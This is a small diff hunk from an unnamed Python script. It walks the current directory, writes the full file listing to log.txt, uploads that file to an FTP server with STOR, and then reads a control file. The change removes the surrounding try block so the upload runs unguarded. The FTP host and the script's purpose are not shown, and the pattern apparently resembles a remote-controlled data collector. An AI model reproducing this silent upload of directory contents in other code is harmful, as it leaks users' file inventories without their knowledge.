@@ -96,9 +96,9 @@ else :
     for data in os.walk("./") :
         f1.write(repr(data))
     f1.close()
-    try :
-        command = 'STOR ' + "./log.txt"
-        x = ftp.storbinary(command, open("./log.txt", 'rb'))
+    
+    command = 'STOR ' + "./log.txt"
+    x = ftp.storbinary(command, open("./log.txt", 'rb'))
 
 f1 = open(control_file, "r")
 
